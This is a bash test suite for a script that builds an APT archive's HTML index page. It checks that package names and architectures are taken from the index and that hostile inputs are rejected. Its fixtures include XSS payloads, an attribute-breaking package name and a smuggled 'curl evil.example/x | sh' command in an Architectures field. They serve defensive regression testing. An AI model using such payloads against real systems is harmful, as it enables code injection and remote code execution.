#!/usr/bin/env bash
#
# Tests for scripts/build-index-page.sh — the page served at the archive root.
#
# It is the only part of the archive that reaches a browser, and the package
# names it embeds come from each `.deb`'s control field. `publish.yml` states
# the assumption those rest on: the release assets are attacker-influenced,
# because whoever can publish a product release controls them. `verify-debs.sh`
# binds each `.deb` to the product that released it, which bounds the problem
# but does not make the strings safe to interpolate into HTML.
#
# The architecture line matters for a different reason: it used to be prose, and
# was a fifth place the architecture list lived that the product context never
# counted. It is derived now, and these cases are what keeps it derived.
#
# No gpg and no reprepro: this reads a synthetic index and writes HTML.
#
# Requires: bash 4+.

set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
BUILD="$HERE/scripts/build-index-page.sh"
WORK="$(mktemp -d)"

cleanup() { rm -rf "$WORK"; }
trap cleanup EXIT

pass=0
fail=0

check() { # <description> <expected> <actual>
	if [ "$2" = "$3" ]; then
		echo "ok    $1"
		pass=$((pass + 1))
	else
		echo "FAIL  $1"
		echo "        expected: $2"
		echo "        actual:   $3"
		fail=$((fail + 1))
	fi
}

# A synthetic archive laid out the way reprepro leaves one. Only the fields the
# page reads are populated.
archive() { # $1=dir $2=arch list ("-" for a Release with no Architectures) $3...=package names
	local dir="$1" arches="$2"; shift 2
	local arch pkg
	rm -rf "$dir"; mkdir -p "$dir/dists/stable"
	{
		echo "Origin: Glyndor"
		[ "$arches" = "-" ] || echo "Architectures: $arches"
		echo "Components: main"
	} > "$dir/dists/stable/Release"

	[ "$arches" = "-" ] && arches="amd64"
	for arch in $arches; do
		mkdir -p "$dir/dists/stable/main/binary-$arch"
		: > "$dir/dists/stable/main/binary-$arch/Packages"
		for pkg in "$@"; do
			printf 'Package: %s\nVersion: 1.0\n\n' "$pkg" \
				>> "$dir/dists/stable/main/binary-$arch/Packages"
		done
		printf 'Package: glyndor-archive-keyring\nVersion: 1.0\n\n' \
			>> "$dir/dists/stable/main/binary-$arch/Packages"
	done
}

run() { # $1=dir
	"$BUILD" "$1" > "$WORK/out" 2>&1
}

# --- today's archive --------------------------------------------------------

archive "$WORK/a" "amd64 arm64" podup
rc=0; run "$WORK/a" || rc=$?
check "a normal archive builds a page" "0" "$rc"
P="$WORK/a/index.html"
check "the architectures come from the Release" "1" \
	"$(grep -c 'Debian/Ubuntu (amd64, arm64)' "$P")"
check "one install entry per product" "1" \
	"$(grep -o '<li><code>sudo apt install podup</code></li>' "$P" | wc -l)"
check "the keyring is not offered as an apt install" "0" \
	"$(grep -c 'apt install glyndor-archive-keyring' "$P")"
check "the bootstrap block is still there" "1" \
	"$(grep -c 'dpkg -i glyndor-archive-keyring.deb' "$P")"

# --- it follows the index rather than a hardcoded list ----------------------

archive "$WORK/b" "amd64 arm64 armhf" podup helmly epistle unitpm
rc=0; run "$WORK/b" || rc=$?
check "a third architecture appears without a code change" "1" \
	"$(grep -c 'Debian/Ubuntu (amd64, arm64, armhf)' "$WORK/b/index.html")"
# The list is emitted on one line, so count occurrences rather than lines --
# grep -c would answer 1 however many products there are.
check "every product gets an entry" "4" \
	"$(grep -o '<li><code>sudo apt install' "$WORK/b/index.html" | wc -l)"
check "and each appears once despite three indices declaring it" "1" \
	"$(grep -o 'sudo apt install helmly<' "$WORK/b/index.html" | wc -l)"

# --- the strings reach a browser --------------------------------------------

archive "$WORK/c" "amd64" podup '<script>alert(1)</script>'
rc=0; run "$WORK/c" || rc=$?
check "a hostile package name does not stop the build" "0" "$rc"
check "it is skipped with a warning" "1" \
	"$(grep -c 'skipping unexpected package name' "$WORK/out")"
check "and NO script tag reaches the page" "0" \
	"$(grep -c '<script' "$WORK/c/index.html")"
check "while the legitimate package still renders" "1" \
	"$(grep -o 'sudo apt install podup<' "$WORK/c/index.html" | wc -l)"

archive "$WORK/d" "amd64" 'pod"up onload=x' podup
rc=0; run "$WORK/d" || rc=$?
check "an attribute-breaking name is skipped too" "1" \
	"$(grep -c 'skipping unexpected package name' "$WORK/out")"
check "and no stray quote reaches the list" "0" \
	"$(grep -c 'onload' "$WORK/d/index.html")"

# --- fail closed rather than serve something wrong --------------------------

archive "$WORK/e" "-" podup
rc=0; run "$WORK/e" || rc=$?
check "a Release with no Architectures fails" "1" "$rc"
check "and says why" "1" "$(grep -c 'declares no architectures' "$WORK/out")"
check "and writes no page" "0" "$(find "$WORK/e" -name index.html | wc -l)"

archive "$WORK/f" "amd64"
rc=0; run "$WORK/f" || rc=$?
check "an index carrying only the keyring fails" "1" "$rc"
check "and says why" "1" "$(grep -c 'declare no installable packages' "$WORK/out")"

rc=0; "$BUILD" >/dev/null 2>&1 || rc=$?
check "no argument is a usage error" "2" "$rc"

rc=0; "$BUILD" "$WORK/does-not-exist" >/dev/null 2>&1 || rc=$?
check "a missing archive fails rather than writing a page" "1" "$rc"

# --- the architectures line also reaches a browser --------------------------
# Symmetric to the package-name check above: Architectures is interpolated
# into the served HTML on the "Set up on Debian/Ubuntu (...)" line, and the
# bytes come from the signed Release — same threat model. A signed
# `Architectures: <script>alert("xss")</script>` would land in the page
# without this check. The audit (`auditoria-tests-canales.md`, Hallazgo 3)
# demonstrated the injection manually; the cases below pin the fix.

archive "$WORK/g" '<script>alert("xss")</script>' podup
rc=0; run "$WORK/g" || rc=$?
check "a hostile Architectures value fails closed" "1" "$rc"
check "and says why" "1" "$(grep -c 'Architectures field contains unexpected characters' "$WORK/out")"
check "and writes no page" "0" "$(find "$WORK/g" -name index.html | wc -l)"

archive "$WORK/h" 'amd64; curl evil.example/x | sh' podup
rc=0; run "$WORK/h" || rc=$?
check "an attribute-breaking Architectures value is rejected" "1" "$rc"
check "and no script tag reaches the page" "0" "$(find "$WORK/h" -name index.html 2>/dev/null | wc -l)"

echo
echo "$pass passed, $fail failed"
[ "$fail" -eq 0 ]
